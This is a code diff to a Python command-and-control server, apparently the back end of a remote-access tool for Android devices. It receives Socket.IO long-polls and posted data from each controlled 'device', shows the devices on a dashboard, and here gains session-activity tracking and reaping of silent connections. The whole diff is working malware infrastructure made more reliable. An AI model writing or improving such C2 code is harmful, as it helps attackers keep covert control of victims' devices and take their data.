@@ -290,6 +290,7 @@ class Device(object):
         self.last_pong = time.monotonic()
         self.bin_buf = []          # incoming binary attachments, in num order
         self.pending_binary = []   # events waiting for their attachments
+        self.last_activity = time.monotonic()   # any HTTP touch (poll/post)
 
 
 class C2Server(object):
@@ -332,8 +333,17 @@ class C2Server(object):
             dev.info["release"] or "?", dev.info["id"] or "?"))
         return "0" + body
 
+    def touch(self, dev):
+        dev.last_activity = time.monotonic()
+
     def poll(self, dev):
+        self.touch(dev)
         with dev.cond:
+            # Hold the long-poll up to 20s. Note: socket.io-client-java 2.0.1
+            # closes the session after an empty poll that was held a short
+            # while (~8s) but tolerates the classic 20s hold, so keep it long.
+            # If a poll ever exceeds the client's 10s read timeout, the app
+            # now reconnects (reconnectionDelayMax=30s) instead of dying.
             deadline = time.monotonic() + 20.0
             while not dev.packets and not dev.closed and time.monotonic() < deadline:
                 dev.cond.wait(0.5)
@@ -474,6 +484,13 @@ class C2Server(object):
                 if dev.closed:
                     continue
                 if dev.eio != 3:                # EIO4: client pings, we pong
+                    # EIO4 sessions are never closed by the client on app kill,
+                    # so reap ones that have gone silent (no HTTP for 2x ping
+                    # timeout) -- otherwise the dashboard lists zombies forever.
+                    if now - dev.last_activity > self.ping_timeout * 2:
+                        log("[!] session silent for %ds, closing %s" % (
+                            int(now - dev.last_activity), dev.eio_sid[:8]))
+                        self.close_device(dev)
                     continue
                 if now - dev.last_ping >= self.ping_interval:
                     dev.last_ping = now
@@ -728,13 +745,14 @@ class Handler(BaseHTTPRequestHandler):
             length = int(self.headers.get("Content-Length") or 0)
         except (TypeError, ValueError):
             length = 0
-        body = self.rfile.read(length).decode("utf-8", "replace")
+        body =        self.rfile.read(length).decode("utf-8", "replace")
         if q.get("b64", ["0"])[0] == "1":
             try:
                 body = base64.b64decode(body).decode("utf-8", "replace")
             except Exception:
                 pass
         log("    POST <- %r (sid %s)" % (body[:160], sid[:8]))
+        self.c2.touch(dev)
         self.c2.post(dev, body)
         return self._send(200, "ok")
 
